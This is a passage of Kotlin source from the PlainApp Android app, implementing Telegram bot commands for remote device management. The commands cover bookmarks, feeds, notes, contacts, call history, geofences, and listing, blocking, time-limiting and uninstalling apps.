                        sendMessage("✅ <b>Bookmark added</b>\n🔗 <code>${htmlEsc(url)}</code>\n<i>id: ${b.id.take(8)}</i>\n\n<i>Title/favicon will fetch in background.</i>")
                        scope.launch {
                            try { BookmarkHelper.fetchMetadataAsync(MainApp.instance, listOf(b.id)) } catch (_: Throwable) {}
                        }
                    } else {
                        sendMessage("✅ Bookmark recorded.")
                    }
                } catch (e: Exception) {
                    sendMessage("❌ Could not add bookmark: ${htmlEsc(e.message ?: "")}")
                }
            }
            "feed_url" -> {
                val url = text.trim()
                if (!url.startsWith("http://") && !url.startsWith("https://")) {
                    sendMessage("❌ Please send a full RSS/Atom URL starting with http:// or https://")
                    return
                }
                try {
                    val existing = FeedHelper.getByUrl(url)
                    if (existing != null) { sendMessage("ℹ️ That feed is already added: <b>${htmlEsc(existing.name)}</b>"); return }
                    val channel = FeedHelper.fetchAsync(url)
                    val name = channel.title?.takeIf { it.isNotBlank() } ?: url
                    val id = FeedHelper.addAsync {
                        this.url = url
                        this.name = name
                    }
                    sendMessage("✅ <b>Feed added</b>\n📡 <b>${htmlEsc(name)}</b>\n<i>id: ${id.take(8)}</i>\n\n<i>Send /feeds to see all feeds.</i>")
                } catch (e: Exception) {
                    sendMessage("❌ Could not add feed: ${htmlEsc(e.message ?: "")}")
                }
            }
            "speak_text" -> {
                val say = text.trim()
                if (say.isEmpty()) { sendMessage("❌ Nothing to speak."); return }
                UtilitiesHelper.speak(say)
                sendMessage("🗣 Speaking on device:\n<i>${htmlEsc(say.take(200))}</i>")
            }
            "show_text" -> {
                val msg = text.trim()
                if (msg.isEmpty()) { sendMessage("❌ Nothing to show."); return }
                if (!android.provider.Settings.canDrawOverlays(MainApp.instance)) {
                    sendMessage("⛔ Display-over-other-apps permission is not granted. Enable it for PlainApp first.")
                    return
                }
                MessageOverlayService.show(title = "PlainApp", message = msg, durationMs = 5000L, blocking = false)
                sendMessage("💡 Banner shown on device:\n<i>${htmlEsc(msg.take(200))}</i>")
            }
            "toast_text" -> {
                val msg = text.trim()
                if (msg.isEmpty()) { sendMessage("❌ Nothing to toast."); return }
                UtilitiesHelper.toast(msg, longToast = msg.length > 40)
                sendMessage("💬 Toast shown on device:\n<i>${htmlEsc(msg.take(200))}</i>")
            }
            "bedtime_set" -> {
                val raw = text.trim()
                val ok = parseAndApplyBedtime(raw)
                if (!ok) {
                    sendMessage("❌ Could not parse <code>${htmlEsc(raw)}</code>.\nUse 24-hour format like <code>22:00 06:30</code> or <code>off</code> to disable.")
                } else {
                    renderBedtimeState(editMessageId = null)
                }
            }
            "note_edit_save" -> {
                val noteId = parts.getOrNull(1) ?: return
                val raw = text.trim()
                if (raw.isEmpty()) { sendMessage("❌ Empty content — note not updated."); return }
                val (title, body) = if (raw.contains('\n')) {
                    val nl = raw.indexOf('\n')
                    raw.substring(0, nl).trim() to raw.substring(nl + 1).trim()
                } else {
                    raw.take(60) to raw
                }
                try {
                    NoteHelper.addOrUpdateAsync(noteId) {
                        this.title = title
                        this.content = body
                    }
                    sendMessage("✅ <b>Note updated</b>\n📝 <b>${htmlEsc(title)}</b>",
                        replyMarkup = TelegramApiClient.inlineKeyboard(listOf(listOf("📝 View note" to "note_view:$noteId"))))
                } catch (e: Exception) {
                    sendMessage("❌ Could not update note: ${htmlEsc(e.message ?: "")}")
                }
            }
            "addcontact_name" -> {
                val nameRaw = text.trim()
                if (nameRaw.isEmpty()) { sendMessage("❌ Name cannot be empty. Send /addcontact to start over."); return }
                val nameTok = phoneToken(nameRaw)
                pendingInput = "addcontact_phone:$nameTok"
                sendMessage("📱 <b>Phone number for ${htmlEsc(nameRaw)}</b>\n\nSend the phone number (with country code if needed).\nSend any /command to cancel.")
            }
            "addcontact_phone" -> {
                val nameTok = parts.getOrNull(1) ?: return
                val name = phoneFromToken(nameTok) ?: run {
                    sendMessage("⚠️ Session expired. Send /addcontact to start over."); return
                }
                val phone = text.trim()
                if (phone.isEmpty()) { sendMessage("❌ Phone number cannot be empty."); return }
                try {
                    val newId = saveQuickContactAsync(name, phone)
                    if (newId.isBlank()) {
                        sendMessage("❌ Could not save contact (no device account available).")
                    } else {
                        sendMessage("✅ <b>Contact added</b>\n👤 <b>${htmlEsc(name)}</b> · <code>${htmlEsc(phone)}</code>",
                            replyMarkup = TelegramApiClient.inlineKeyboard(listOf(listOf("👤 View contact" to "c_view:$newId"))))
                    }
                } catch (e: Exception) {
                    sendMessage("❌ Could not add contact: ${htmlEsc(e.message ?: "")}")
                }
            }
            "deletecontact_search" -> {
                val q = text.trim()
                if (q.isEmpty()) { sendMessage("❌ Please send a name or number to search."); return }
                renderDeleteContactSearch(q)
            }
            "gf_new" -> {
                val raw = text.trim()
                val parts2 = raw.split(",").map { it.trim() }
                if (parts2.size < 4) {
                    sendMessage("❌ Invalid format. Please use:\n<code>Name, lat, lng, radius_m</code>\n\nExample:\n<code>Home, 28.6139, 77.2090, 200</code>")
                    return
                }
                val name = parts2[0]
                val lat = parts2[1].toDoubleOrNull()
                val lng = parts2[2].toDoubleOrNull()
                val radius = parts2[3].toDoubleOrNull()
                if (lat == null || lng == null || radius == null || radius <= 0) {
                    sendMessage("❌ lat, lng, and radius must be valid numbers (radius > 0).")
                    return
                }
                GeofencingHelper.newFence(name, lat, lng, radius)
                sendMessage("✅ <b>Geofence added</b>\n🗺 <b>${htmlEsc(name)}</b>\n📍 $lat, $lng · radius ${radius.toInt()} m",
                    replyMarkup = TelegramApiClient.inlineKeyboard(listOf(listOf("📋 View all geofences" to "gf_list"))))
            }
            "cc_search" -> {
                val q = text.trim()
                renderClearCachePage(if (q == "*") "" else q, 0, editMessageId = null)
            }
            else -> { /* ignore */ }
        }
    }

    /**
     * /find <number> — reverse-lookup a phone number against the device contacts.
     *
     * Uses ContactsContract.PhoneLookup which matches by E.164 / normalized number,
     * so it works with or without country code, spaces, dashes, or parentheses.
     * If the number isn't saved, we offer Call / SMS / Save-as-contact buttons.
     */
    private suspend fun cmdFind(args: List<String>) {
        sendTyping()
        if (args.isEmpty()) {
            sendMessage("ℹ️ Usage: <code>/find &lt;number&gt;</code>\n\nExample: <code>/find +1 415 555 0123</code>")
            return
        }
        val raw = args.joinToString(" ").trim()
        // Strip Telegram-style trailing punctuation a user may copy-paste from a chat.
        val number = raw.trimEnd(',', '.', ';')
        try {
            val ctx = MainApp.instance
            val uri = android.net.Uri.withAppendedPath(
                android.provider.ContactsContract.PhoneLookup.CONTENT_FILTER_URI,
                android.net.Uri.encode(number),
            )
            var contactId: Long = -1L
            var displayName = ""
            ctx.contentResolver.query(
                uri,
                arrayOf(
                    android.provider.ContactsContract.PhoneLookup._ID,
                    android.provider.ContactsContract.PhoneLookup.DISPLAY_NAME,
                ),
                null, null, null,
            )?.use { cur ->
                if (cur.moveToFirst()) {
                    contactId = cur.getLong(0)
                    displayName = cur.getString(1) ?: ""
                }
            }

            if (contactId > 0) {
                // Translate the aggregated contact id to the raw_contact_id our helpers use.
                var rawId = ""
                ctx.contentResolver.query(
                    android.provider.ContactsContract.RawContacts.CONTENT_URI,
                    arrayOf(android.provider.ContactsContract.RawContacts._ID),
                    "${android.provider.ContactsContract.RawContacts.CONTACT_ID}=?",
                    arrayOf(contactId.toString()),
                    null,
                )?.use { cur -> if (cur.moveToFirst()) rawId = cur.getLong(0).toString() }

                if (rawId.isNotBlank()) {
                    sendMessage("✅ Match: <b>${htmlEsc(displayName.ifBlank { number })}</b> · <code>${htmlEsc(number)}</code>")
                    renderContactDetail(rawId, editMessageId = null)
                    return
                }
            }

            // Not in contacts — offer quick actions.
            val tok = phoneToken(number)
            val text = "🔍 <b>No contact</b> matches <code>${htmlEsc(number)}</code>\n\n" +
                "<i>Pick an action below.</i>"
            val rows = listOf(
                listOf(
                    "📞 Call" to "nf_call:$tok",
                    "💬 SMS" to "nf_sms:$tok",
                ),
                listOf("💾 Save as new contact" to "nf_save:$tok"),
            )
            sendMessage(text, replyMarkup = TelegramApiClient.inlineKeyboard(rows))
        } catch (e: Exception) {
            sendMessage("❌ Lookup failed: ${htmlEsc(e.message ?: "")}")
        }
    }

    /**
     * Insert a minimal contact (display name + one phone number) into the device
     * address book and return the new RAW_CONTACT_ID. Splits the display name on the
     * first space into given / family for ContactsContract.StructuredName.
     */
    private suspend fun saveQuickContactAsync(displayName: String, phone: String): String {
        val source = com.ismartcoding.plain.features.contact.SourceHelper.getAll()
            .firstOrNull { it.name.isNotBlank() }
            ?: com.ismartcoding.plain.features.contact.SourceHelper.getAll().firstOrNull()
            ?: return ""
        val trimmed = displayName.trim()
        val first: String
        val last: String
        val sp = trimmed.indexOf(' ')
        if (sp > 0) {
            first = trimmed.substring(0, sp)
            last = trimmed.substring(sp + 1).trim()
        } else {
            first = trimmed
            last = ""
        }
        val input = com.ismartcoding.plain.web.models.ContactInput(
            firstName = first,
            lastName = last,
            source = source.name,
            phoneNumbers = listOf(
                com.ismartcoding.plain.web.models.ContentItemInput(
                    value = phone,
                    type = android.provider.ContactsContract.CommonDataKinds.Phone.TYPE_MOBILE,
                ),
            ),
        )
        return com.ismartcoding.plain.features.media.ContactMediaStoreHelper.createAsync(input)
    }

    private suspend fun renderContactDetail(rawId: String, editMessageId: Long?) {
        try {
            val c = ContactMediaStoreHelper.getByIdAsync(MainApp.instance, rawId)
            if (c == null) {
                val msg = "❌ Contact not found (id $rawId)."
                if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, msg)
                else sendMessage(msg)
                return
            }
            val display = contactDisplayName(c)
            val sb = StringBuilder()
            sb.append("👤 <b>${htmlEsc(display)}</b>\n")
            sb.append("━━━━━━━━━━━━━━━━━━━━\n")
            val org = c.organization
            if (org != null && (org.company.isNotBlank() || org.title.isNotBlank())) {
                val parts = listOfNotNull(
                    org.company.takeIf { it.isNotBlank() },
                    org.title.takeIf { it.isNotBlank() },
                ).joinToString(" · ")
                sb.append("🏢 ${htmlEsc(parts)}\n")
            }
            if (c.nickname.isNotBlank()) sb.append("🏷 <i>${htmlEsc(c.nickname)}</i>\n")
            if (org != null || c.nickname.isNotBlank()) sb.append("\n")

            if (c.phoneNumbers.isNotEmpty()) {
                sb.append("<b>📞 Phone numbers</b>\n")
                c.phoneNumbers.forEach { ph ->
                    val label = phoneTypeLabel(ph.type, ph.label)
                    val labelTxt = if (label.isNotBlank()) "  · $label" else ""
                    sb.append("   • <code>${htmlEsc(ph.value)}</code>$labelTxt\n")
                }
                sb.append("\n")
            }
            if (c.emails.isNotEmpty()) {
                sb.append("<b>📧 Email</b>\n")
                c.emails.forEach { sb.append("   • <code>${htmlEsc(it.value)}</code>\n") }
                sb.append("\n")
            }
            if (c.addresses.isNotEmpty()) {
                sb.append("<b>📍 Address</b>\n")
                c.addresses.forEach { sb.append("   • ${htmlEsc(it.value)}\n") }
                sb.append("\n")
            }
            if (c.websites.isNotEmpty()) {
                sb.append("<b>🔗 Website</b>\n")
                c.websites.forEach { sb.append("   • ${htmlEsc(it.value)}\n") }
                sb.append("\n")
            }
            if (c.notes.isNotBlank()) {
                sb.append("<b>📝 Note</b>\n   ${htmlEsc(c.notes.take(500))}\n\n")
            }

            // Action keyboard: per-phone Call + SMS rows, then Share + Call History + Back.
            val rows = mutableListOf<List<Pair<String, String>>>()
            c.phoneNumbers.take(5).forEach { ph ->
                val tok = phoneToken(ph.value)
                val short = ph.value.take(18)
                rows.add(listOf(
                    "📞 Call $short" to "c_call:$tok",
                    "💬 SMS $short" to "c_sms:$tok",
                ))
            }
            if (c.phoneNumbers.isNotEmpty()) {
                rows.add(listOf(
                    "📤 Share contact card" to "c_share:$rawId",
                    "📋 Call History" to "c_calls:$rawId",
                ))
            }
            rows.add(listOf("🗑 Delete contact" to "con_del_ok:$rawId", "⬅️ Back to list" to "c_back"))
            val markup = TelegramApiClient.inlineKeyboard(rows)
            if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, sb.toString(), replyMarkup = markup)
            else sendMessage(sb.toString(), replyMarkup = markup)
        } catch (e: Exception) {
            val msg = "❌ Could not load contact: ${htmlEsc(e.message ?: "")}"
            if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, msg)
            else sendMessage(msg)
        }
    }

    private fun phoneTypeLabel(type: Int, customLabel: String): String {
        if (customLabel.isNotBlank()) return customLabel
        return when (type) {
            android.provider.ContactsContract.CommonDataKinds.Phone.TYPE_HOME -> "Home"
            android.provider.ContactsContract.CommonDataKinds.Phone.TYPE_MOBILE -> "Mobile"
            android.provider.ContactsContract.CommonDataKinds.Phone.TYPE_WORK -> "Work"
            android.provider.ContactsContract.CommonDataKinds.Phone.TYPE_FAX_WORK -> "Work fax"
            android.provider.ContactsContract.CommonDataKinds.Phone.TYPE_FAX_HOME -> "Home fax"
            android.provider.ContactsContract.CommonDataKinds.Phone.TYPE_PAGER -> "Pager"
            android.provider.ContactsContract.CommonDataKinds.Phone.TYPE_OTHER -> "Other"
            android.provider.ContactsContract.CommonDataKinds.Phone.TYPE_MAIN -> "Main"
            else -> ""
        }
    }

    private suspend fun cbShareContact(rawId: String) {
        try {
            val c = ContactMediaStoreHelper.getByIdAsync(MainApp.instance, rawId)
            if (c == null) { sendMessage("❌ Contact not found."); return }
            val phone = c.phoneNumbers.firstOrNull()?.value
            if (phone.isNullOrBlank()) { sendMessage("❌ This contact has no phone number to share."); return }
            val first = c.givenName.ifBlank { contactDisplayName(c) }
            val last = c.familyName.ifBlank { null }
            val vcard = buildVCard(c)
            val ok = TelegramApiClient.sendContact(token, chatId, phone, first, last, vcard)
            if (!ok) sendMessage("❌ Telegram refused the contact card.")
        } catch (e: Exception) {
            sendMessage("❌ Could not share contact: ${htmlEsc(e.message ?: "")}")
        }
    }

    private fun buildVCard(c: com.ismartcoding.plain.data.DContact): String {
        val sb = StringBuilder()
        sb.append("BEGIN:VCARD\r\nVERSION:3.0\r\n")
        val display = contactDisplayName(c)
        sb.append("FN:$display\r\n")
        sb.append("N:${c.familyName};${c.givenName};${c.middleName};${c.prefix};${c.suffix}\r\n")
        if (c.nickname.isNotBlank()) sb.append("NICKNAME:${c.nickname}\r\n")
        c.organization?.let { o ->
            if (o.company.isNotBlank()) sb.append("ORG:${o.company}\r\n")
            if (o.title.isNotBlank()) sb.append("TITLE:${o.title}\r\n")
        }
        c.phoneNumbers.forEach { sb.append("TEL:${it.value}\r\n") }
        c.emails.forEach { sb.append("EMAIL:${it.value}\r\n") }
        c.addresses.forEach { sb.append("ADR:;;${it.value};;;;\r\n") }
        c.websites.forEach { sb.append("URL:${it.value}\r\n") }
        if (c.notes.isNotBlank()) sb.append("NOTE:${c.notes.replace("\n", "\\n")}\r\n")
        sb.append("END:VCARD\r\n")
        return sb.toString()
    }

    /** Robust display name for a contact: structured name → nickname → organization → first phone → "(no name)". */
    private fun contactDisplayName(c: com.ismartcoding.plain.data.DContact): String {
        val full = c.fullName().trim()
        if (full.isNotEmpty()) return full
        if (c.nickname.isNotBlank()) return c.nickname
        val org = c.organization
        if (org != null && org.company.isNotBlank()) return org.company
        val phone = c.phoneNumbers.firstOrNull()?.value?.trim().orEmpty()
        if (phone.isNotEmpty()) return phone
        return "(no name)"
    }

    /** Render call log entries that match any of this contact's phone numbers. */
    private suspend fun renderContactCallsPage(rawId: String, offset: Int, editMessageId: Long?) {
        try {
            val c = ContactMediaStoreHelper.getByIdAsync(MainApp.instance, rawId)
            if (c == null) {
                val msg = "❌ Contact not found."
                if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, msg)
                else sendMessage(msg)
                return
            }
            val display = contactDisplayName(c)
            val phones = c.phoneNumbers.map { it.value.filter { ch -> ch.isDigit() } }.filter { it.isNotEmpty() }
            if (phones.isEmpty()) {
                val msg = "📞 <b>${htmlEsc(display)}</b> has no phone numbers — no call history available."
                if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, msg)
                else sendMessage(msg)
                return
            }
            val pageSize = 15
            // Fetch call logs for each phone number and merge results client-side
            val allCalls = mutableListOf<DCall>()
            for (phone in phones) {
                val results = try { CallMediaStoreHelper.searchAsync(MainApp.instance, phone, 200, 0) } catch (_: Exception) { emptyList() }
                allCalls.addAll(results)
            }
            // De-duplicate by ID and sort newest first
            val deduped = allCalls.distinctBy { it.id }.sortedByDescending { it.startedAt.toEpochMilliseconds() }
            val window = deduped.drop(offset).take(pageSize + 1)
            val hasMore = window.size > pageSize
            val pageItems = window.take(pageSize)
            if (pageItems.isEmpty()) {
                val msg = if (offset == 0) "📞 No call history found for <b>${htmlEsc(display)}</b>." else "📞 No more entries."
                if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, msg)
                else sendMessage(msg)
                return
            }
            val sb = StringBuilder("📋 <b>Call History — ${htmlEsc(display)}</b>\n")
            sb.append("Showing ${offset + 1}–${offset + pageItems.size}\n\n")
            pageItems.forEachIndexed { i, call ->
                val typeEmoji = when (call.type) {
                    CallLog.Calls.INCOMING_TYPE -> "📲 Incoming"
                    CallLog.Calls.OUTGOING_TYPE -> "📤 Outgoing"
                    CallLog.Calls.MISSED_TYPE -> "❌ Missed"
                    CallLog.Calls.REJECTED_TYPE -> "🚫 Rejected"
                    else -> "📞"
                }
                val dur = if (call.duration > 0) "  ⏱ ${call.duration}s" else ""
                // Resolve the name for this specific number (contact may have multiple numbers)
                val resolvedName = call.name.ifBlank { lookupContactName(call.number) }
                sb.append("${offset + i + 1}. $typeEmoji$dur\n")
                if (resolvedName.isNotBlank()) {
                    sb.append("   👤 <b>${htmlEsc(resolvedName)}</b>\n")
                }
                sb.append("   📱 <code>${htmlEsc(call.number)}</code>\n")
                sb.append("   🕐 ${fmtTime(call.startedAt.toEpochMilliseconds())}\n\n")
            }
            val rows = mutableListOf<List<Pair<String, String>>>()
            val nav = mutableListOf<Pair<String, String>>()
            if (offset > 0) nav.add("◀️ Prev" to "c_calls_pg:$rawId:${(offset - pageSize).coerceAtLeast(0)}")
            if (hasMore) nav.add("Next ▶️" to "c_calls_pg:$rawId:${offset + pageSize}")
            if (nav.isNotEmpty()) rows.add(nav)
            rows.add(listOf("⬅️ Back to contact" to "c_view:$rawId:_:0"))
            val markup = TelegramApiClient.inlineKeyboard(rows)
            if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, sb.toString(), replyMarkup = markup)
            else sendMessage(sb.toString(), replyMarkup = markup)
        } catch (e: Exception) {
            val msg = "❌ Could not load call history: ${htmlEsc(e.message ?: "")}"
            if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, msg)
            else sendMessage(msg)
        }
    }

    /** Free-form text query the user is currently scrolling. Empty = all apps. */
    @Volatile private var lastAppsQuery: String = ""

    private suspend fun cmdApps(args: List<String>) {
        sendTyping()
        lastAppsQuery = args.joinToString(" ").trim()
        renderAppsPickerPage(lastAppsQuery, offset = 0, editMessageId = null)
    }

    /**
     * Modern paginated app picker. Each row is a tappable inline button that opens
     * the per-app action menu (renderAppDetail). The header summarizes the page,
     * and footer rows give Prev / Next / 🔍 Search controls.
     */
    private suspend fun renderAppsPickerPage(query: String, offset: Int, editMessageId: Long?) {
        sendTyping()
        try {
            val pageSize = 10
            val q = if (query.isBlank()) "" else "text:$query"
            val apps = PackageHelper.searchAsync(
                q, pageSize + 1, offset,
                com.ismartcoding.plain.features.file.FileSortBy.NAME_ASC,
            )
            val hasMore = apps.size > pageSize
            val pageItems = apps.take(pageSize)
            val limits = AppBlockHelper.getTimeLimits()
            val title = StringBuilder("📱 <b>Installed Apps</b>")
            if (query.isNotBlank()) title.append(" — search: <code>${htmlEsc(query)}</code>")
            title.append("\n")
            if (pageItems.isEmpty()) {
                val msg = "$title\n\nNo apps found.\nTry <code>/apps</code> to clear the search."
                if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, msg)
                else sendMessage(msg)
                return
            }
            title.append("Showing ${offset + 1}–${offset + pageItems.size}  ·  tap any app for actions\n\n")
            val sb = StringBuilder(title)
            val rows = mutableListOf<List<Pair<String, String>>>()
            pageItems.forEachIndexed { i, a ->
                val blocked = AppBlockHelper.isBlocked(a.id)
                val limited = limits.containsKey(a.id)
                val tag = when {
                    blocked -> " 🚫"
                    limited -> " ⏱"
                    else -> ""
                }
                sb.append("${offset + i + 1}. <b>${htmlEsc(a.name)}</b>$tag\n")
                sb.append("   <code>${htmlEsc(a.id)}</code>  ·  v${htmlEsc(a.version)}\n\n")
                rows.add(listOf("${offset + i + 1}. ${a.name.take(28)}$tag" to "appd:${pkgToken(a.id)}"))
            }
            val nav = mutableListOf<Pair<String, String>>()
            if (offset > 0) nav.add("◀️ Prev" to "apps_pg:${(offset - pageSize).coerceAtLeast(0)}")
            if (hasMore) nav.add("Next ▶️" to "apps_pg:${offset + pageSize}")
            if (nav.isNotEmpty()) rows.add(nav)
            rows.add(listOf("🔍 Search apps" to "apps_q", "🔄 Refresh" to "apps_pg:0"))
            val markup = TelegramApiClient.inlineKeyboard(rows)
            if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, sb.toString(), replyMarkup = markup)
            else sendMessage(sb.toString(), replyMarkup = markup)
        } catch (e: Exception) {
            sendMessage("❌ Could not list apps: ${htmlEsc(e.message ?: "")}")
        }
    }

    /**
     * Per-app action panel. Shows everything you'd want to do with the app —
     * launch it, open its system Settings page, block it instantly, time-limit
     * it for the day, uninstall it, pull its APK & icon down to Telegram, copy
     * its package id to the device clipboard, and a Play Store link.
     */
    private suspend fun renderAppDetail(pkg: String, editMessageId: Long?) {
        try {
            val info = try {
                PackageHelper.searchAsync(
                    "ids:$pkg", 1, 0,
                    com.ismartcoding.plain.features.file.FileSortBy.NAME_ASC,
                ).firstOrNull()
            } catch (_: Exception) { null }
            if (info == null) {
                val msg = "❌ App not found or no longer installed: <code>${htmlEsc(pkg)}</code>"
                if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, msg)
                else sendMessage(msg)
                return
            }
            val isSystem = (info.appInfo.flags and android.content.pm.ApplicationInfo.FLAG_SYSTEM) != 0
            val canLaunch = PackageHelper.canLaunch(pkg)
            val isBlocked = AppBlockHelper.isBlocked(pkg)
            val limitMs = AppBlockHelper.getTimeLimits()[pkg]
            val installed = SimpleDateFormat("yyyy-MM-dd", Locale.getDefault())
                .format(java.util.Date(info.installedAt.toEpochMilliseconds()))
            val updated = SimpleDateFormat("yyyy-MM-dd", Locale.getDefault())
                .format(java.util.Date(info.updatedAt.toEpochMilliseconds()))
            val apkSize = humanSize(info.size)
            val text = buildString {
                append("📱 <b>${htmlEsc(info.name)}</b>\n")
                append("<code>${htmlEsc(info.id)}</code>\n\n")
                append("🏷 <b>Version:</b> ${htmlEsc(info.version)}\n")
                append("📦 <b>APK size:</b> $apkSize\n")
                append("📅 <b>Installed:</b> $installed\n")
                append("🔄 <b>Updated:</b> $updated\n")
                append("🛠 <b>Type:</b> ${if (isSystem) "System app" else "User app"}\n")
                append("🚀 <b>Launchable:</b> ${if (canLaunch) "yes" else "no (background only)"}\n")
                when {
                    isBlocked -> append("🚫 <b>Status:</b> Blocked\n")
                    limitMs != null -> append("⏱ <b>Status:</b> Limited to ${limitMs / 60_000} min/day\n")
                    else -> append("✅ <b>Status:</b> Active\n")
                }
            }
            val tok = pkgToken(pkg)
            val rows = mutableListOf<List<Pair<String, String>>>()
            // Row 1 — primary actions: launch + settings page
            val row1 = mutableListOf<Pair<String, String>>()
            if (canLaunch) row1.add("▶️ Launch" to "appl:$tok")
            row1.add("⚙️ Settings page" to "appst:$tok")
            rows.add(row1)
            // Row 2 — block / unblock
            if (isBlocked) {
                rows.add(listOf("✅ Unblock" to "appunblock:$tok"))
            } else {
                rows.add(listOf("🚫 Block always" to "appblock:$tok"))
            }
            // Row 3 — time-limit shortcuts (or clear if a limit is set)
            if (limitMs != null) {
                rows.add(listOf("✕ Clear ${limitMs / 60_000} min limit" to "appclim:$tok"))
            } else {
                rows.add(listOf(
                    "⏱ 30 min" to "applimit:$tok:30",
                    "⏱ 1 h" to "applimit:$tok:60",
                    "⏱ 2 h" to "applimit:$tok:120",
                ))
            }
            // Row 4 — file ops: APK + icon download
            rows.add(listOf(
                "📥 Download APK" to "appapk:$tok",
                "🖼 Send icon" to "appicn:$tok",
            ))
            // Row 5 — utilities: clipboard + play store url + uninstall
            rows.add(listOf(
                "📋 Copy package id" to "appcp:$tok",
                "🛒 Play Store" to "url:https://play.google.com/store/apps/details?id=$pkg",
            ))
            // Row 6 — danger zone (system apps can't be uninstalled normally)
            if (!isSystem) {
                rows.add(listOf("🗑 Uninstall" to "appu:$tok"))
            }
            // Row 7 — back to list
            rows.add(listOf("◀️ Back to apps" to "apps_pg:0"))

            val markup = TelegramApiClient.inlineKeyboard(rows)
            if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, text, replyMarkup = markup)
            else sendMessage(text, replyMarkup = markup)
        } catch (e: Exception) {
            sendMessage("❌ Could not open app details: ${htmlEsc(e.message ?: "")}")
        }
    }

    private suspend fun cmdBlockApp(args: List<String>) {
        if (args.isNotEmpty()) {
            val pkg = args[0]
            AppBlockHelper.setBlocked(pkg, true)
            sendMessage("🚫 <b>${htmlEsc(pkg)}</b> is now blocked.\n\nUse /unblockapp $pkg to unblock.")
            return
        }
        renderAppPickerForBlock(query = "", offset = 0, editMessageId = null)
    }

    private suspend fun cmdUnblockApp(args: List<String>) {
        if (args.isNotEmpty()) {
            val pkg = args[0]
            AppBlockHelper.setBlocked(pkg, false)
            sendMessage("✅ <b>${htmlEsc(pkg)}</b> is now unblocked.")
            return
        }
        renderUnblockPicker(editMessageId = null)
    }

    private fun cmdBlockedApps() {
        scope.launch { renderUnblockPicker(editMessageId = null) }
    }

    /** Show installed apps with inline buttons; tapping opens the per-app block menu. */
    private suspend fun renderAppPickerForBlock(query: String, offset: Int, editMessageId: Long?) {
        sendTyping()
        try {
            val pageSize = 12
            val apps = PackageHelper.searchAsync(
                if (query.isEmpty()) "" else "text:$query",
                pageSize + 1, offset,
                com.ismartcoding.plain.features.file.FileSortBy.NAME_ASC
            )
            val hasMore = apps.size > pageSize
            val pageItems = apps.take(pageSize)
            if (pageItems.isEmpty()) {
                val msg = "📱 No apps found."
                if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, msg)
                else sendMessage(msg)
                return
            }
            val title = "🚫 <b>Block an app</b>\n<i>Tap an app to choose a block option.</i>\n" +
                "Showing ${offset + 1}–${offset + pageItems.size}\n\n"
            val sb = StringBuilder(title)
            val rows = mutableListOf<List<Pair<String, String>>>()
            pageItems.forEachIndexed { i, a ->
                val blockedTag = if (AppBlockHelper.isBlocked(a.id)) " 🚫" else ""
                sb.append("${offset + i + 1}. <b>${htmlEsc(a.name)}</b>$blockedTag\n   <code>${htmlEsc(a.id)}</code>\n")
                rows.add(listOf("${a.name.take(28)}$blockedTag" to "block_pick:${a.id.take(50)}"))
            }
            val nav = mutableListOf<Pair<String, String>>()
            if (offset > 0) nav.add("◀️ Prev" to "block_list:${(offset - pageSize).coerceAtLeast(0)}")
            if (hasMore) nav.add("Next ▶️" to "block_list:${offset + pageSize}")
            if (nav.isNotEmpty()) rows.add(nav)
            rows.add(listOf("🔍 Search apps" to "blockapp_q", "🔄 Refresh" to "block_list:0"))
            val markup = TelegramApiClient.inlineKeyboard(rows)
            if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, sb.toString(), replyMarkup = markup)
            else sendMessage(sb.toString(), replyMarkup = markup)
        } catch (e: Exception) {
            sendMessage("❌ Could not list apps: ${htmlEsc(e.message ?: "")}")
        }
    }

    /** After tapping an app, show the block-action menu (instant or timed). */
    private suspend fun renderBlockActionMenu(pkg: String, editMessageId: Long) {
        val name = try {
            PackageHelper.searchAsync("ids:$pkg", 1, 0, com.ismartcoding.plain.features.file.FileSortBy.NAME_ASC).firstOrNull()?.name ?: pkg
        } catch (_: Exception) { pkg }
        val text = buildString {
            append("📱 <b>${htmlEsc(name)}</b>\n<code>${htmlEsc(pkg)}</code>\n\n")
            append("Choose a block option:")
        }
        val rows = listOf(
            listOf("🚫 Block now (always)" to "block_now:${pkg.take(50)}"),
            listOf(
                "⏱ 30 min today" to "block_lim:${pkg.take(45)}:30",
                "⏱ 1 h today" to "block_lim:${pkg.take(45)}:60",
            ),
            listOf(
                "⏱ 2 h today" to "block_lim:${pkg.take(45)}:120",
                "⏱ 4 h today" to "block_lim:${pkg.take(45)}:240",
            ),
            listOf("◀️ Back" to "block_list:0"),
        )
        TelegramApiClient.editMessageText(
            token, chatId, editMessageId, text,
            replyMarkup = TelegramApiClient.inlineKeyboard(rows)
        )
    }

    /** Show currently blocked apps as inline keyboard; tapping unblocks. */
    private suspend fun renderUnblockPicker(editMessageId: Long?) {
        val blocked = AppBlockHelper.getBlockedSet().toList()
        val limits = AppBlockHelper.getTimeLimits()
        if (blocked.isEmpty() && limits.isEmpty()) {
            val msg = "✅ No apps are currently blocked or limited."
            if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, msg)
            else sendMessage(msg)
            return
        }
        // Resolve nice names
        val ids = (blocked + limits.keys).distinct()
        val nameMap = try {
            PackageHelper.searchAsync("ids:${ids.joinToString(",")}", ids.size, 0, com.ismartcoding.plain.features.file.FileSortBy.NAME_ASC)
                .associate { it.id to it.name }
        } catch (_: Exception) { emptyMap() }

        val sb = StringBuilder("📵 <b>Blocked & limited apps</b>\n<i>Tap to unblock / clear limit.</i>\n\n")
        val rows = mutableListOf<List<Pair<String, String>>>()
        blocked.forEachIndexed { i, pkg ->
            val nm = nameMap[pkg] ?: pkg
            sb.append("${i + 1}. 🚫 <b>${htmlEsc(nm)}</b>\n   <code>${htmlEsc(pkg)}</code>\n\n")
